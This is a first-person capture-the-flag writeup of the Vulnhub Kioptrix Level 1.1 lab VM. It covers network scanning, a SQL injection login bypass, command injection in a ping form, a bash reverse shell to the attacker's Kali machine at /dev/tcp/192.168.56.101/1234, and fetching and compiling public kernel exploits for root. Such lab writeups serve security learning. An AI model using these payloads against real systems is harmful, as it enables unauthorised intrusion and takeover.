title: Vulnhub \- Kioptrix: Level 1.1 (#2)
---

This is my first writeup of a Vulnhub VM, so let's see how this goes...

This writeup is for the Kioptrix: Level 1.1 (#2) found [here](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/).

The VM was run using VMWare and the attacking machine was a Kali Linux VM running in Virtualbox, both in host-only networking mode.

## Recon and Enumeration
I used netdiscover to find the IP of the box.
```
root@kali:~# netdiscover
```
![netdiscover output]({{ site.baseurl }}/images/KioptrixLevel1_1/netdiscover.png "netdiscover output")

Because I knew that the VM was running in VMWare, I chose the VMWare IP, 192.168.56.106

I then ran `nmap` to find open ports with services running on them.

```
root@kali:~# nmap 192.168.56.106
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-20 13:18 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers

MAC Address: 00:0C:29:51:2F:3D (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```

I noticed that there may be an http server running on the box, so I went to the IP address in a web browser and was presented with a logon page.

## Vulnerability Discovery and Exploitation

![Logon page]({{ site.baseurl }}/images/KioptrixLevel1_1/logon.png "Logon page")

I tested a few basic username and password combinations, but it didn't seem to do anything. I ran OWASP ZAP to find any potential vulnerabilities or hidden pages. Using an automated scan, ZAP detected a possible SQL injection vulnerability on the logon page.

![ZAP Results]({{ site.baseurl }}/images/KioptrixLevel1_1/zap.png "ZAP Results")

I plugged the attack used (`ZAP' OR '1'='1' --`) into the username field and was presented with a form to ping a machine on the network. I immanently suspected there to be a bash injection vulnerability, but I plugged in an IP to make sure.

This brought me to a page containing the output to the ping command.

![ping results]({{ site.baseurl }}/images/KioptrixLevel1_1/ping.png "ping Results")

I ran `; ls` to make sure that I could inject a command and was presented with a directory listing. Next, I injected a reverse shell by first opening a netcat listener on my Kali VM and then putting the shell code into the form.

```
root@kali:~# nc -nvlp 1234
```

```
; bash -i >& /dev/tcp/192.168.56.101/1234 0>&1
```

This presented me with a shell on my Kali VM.

## Privilege Escalation

I first check the user that I am.

```
bash-3.00$ whoami
apache
```

I look around a bit to find possible things to exploit, but I can't find anything obvious.

Next, I check the kernel version to see if there are any exploits available.

```
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
```

I found that the box was vulnerable to ['ip_append_data()' Ring0 Privilege Escalation](https://www.exploit-db.com/exploits/9542).

Because neither box was connected to the internet, I used a shared folder on my Kali VM to move the exploit to it. I then used the python SimpleHTTPServer to send the file to the box.

```
root@kali:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

I used `wget` on the box to retrieve the file from my Kali VM.

```
bash-3.00$ cd /tmp
bash-3.00$ wget 192.168.56.101/9542.c
--10:41:56--  http://192.168.56.101/9542.c
           => `9542.c'
Connecting to 192.168.56.101:80... connected.

    0K ..                                                    100%    5.65 MB/s

10:41:56 (5.65 MB/s) - `9542.c' saved [2643/2643]
```

I then compiled it according to the instructions and ran it.

```
bash-3.00$ gcc -o 9542 9542.c
bash-3.00$ ./9542
[-] exploit failed, try again
```

This unfortunately didn't work. I looked at the source code to figure out why, but couldn't figure it out as this error is supposed to happen when the uid did not change with the exploit.

I uploaded [linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py) and ran it to find other potential vulnerabilities with the box.

```
bash-3.00$ python linuxprivchecker.py

```

I tested the [2.6 UDEV < 141 Local Privilege Escalation Exploit](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py) using the same methodology as above, but it didn't work either. I went down to the [2.4/2.6 sock_sendpage() Local Root Exploit (ppc)](http://www.exploit-db.com/exploits/9545), once again with the same methodology
and this time it worked.
